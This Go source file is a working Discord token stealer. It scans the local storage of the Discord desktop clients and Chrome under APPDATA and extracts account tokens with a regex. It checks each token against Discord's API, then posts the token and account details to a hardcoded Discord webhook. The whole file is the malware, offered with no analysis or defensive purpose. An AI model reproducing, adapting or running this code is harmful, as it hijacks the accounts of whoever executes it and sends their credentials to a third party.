package main

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path"
	"regexp"
	"strconv"
)

var (
	logs []string
	tokens []string
	client http.Client
	appdata = os.Getenv("APPDATA")
	webhook = "https://discord.com/api/webhooks/814786604521881600/0ns5olXAdjLCQLMSD3VhYpmRfQkW8TcnQ8DfQ6VVzrW9pNQM588ktlkwrjRRTvEylV7n"
	// took these off google lmao
	directories = []string{"\\discord\\Local Storage\\leveldb" , "\\Lightcord\\Local Storage\\leveldb",
						   "\\discordptb\\Local Storage\\leveldb",  "\\discordcanary\\Local Storage\\leveldb",
							"\\..\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"}
	authorization, _ = regexp.Compile("[N][\\w-]{23}[.][\\w-]{6}[.][\\w-]{27}|mfa.[A-Za-z0-9-_]{84}")
)

type account struct {
	Username string `json:"username"`
	Discriminator string `json:"discriminator"`
	Id string `json:"id"`
	Locale string `json:"locale"`
	Avatar string `json:"avatar"`
	Premium int `json:"premium_type"`
}

func main() {
	for _, directory := range directories {
		directory = appdata + directory
		files, _ := os.ReadDir(directory)
		for _, file := range files {
			logs = append(logs, path.Join(directory + "\\" + file.Name()))
		}
	}

	for _, log := range logs {
		file, _ := os.Open(log)
		buffer, _ := ioutil.ReadAll(file)
		match := authorization.FindString(string(buffer))
		if match != "" {
			tokens = append(tokens, match)
		}
	}

	for _, token := range tokens {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v8/users/@me", nil)
		req.Header.Set("authorization", token)
		res, _ := client.Do(req)
		if res.StatusCode == http.StatusOK {
			var user account
			bytes, _ := ioutil.ReadAll(res.Body)
			_ = json.Unmarshal(bytes, &user)
			_, _ = http.PostForm(webhook, url.Values{"username": {user.Username},
				"avatar_url": {"https://cdn.discordapp.com/avatars/" + user.Id + "/" + user.Avatar},
				"content" : {"username: " + user.Username + "#" + user.Discriminator +
				"\ntoken: " + token + "\nid: " + user.Id + "\nlocale: " + user.Locale +
				"\nnitro: " + strconv.Itoa(user.Premium)}})
		}
	}

}
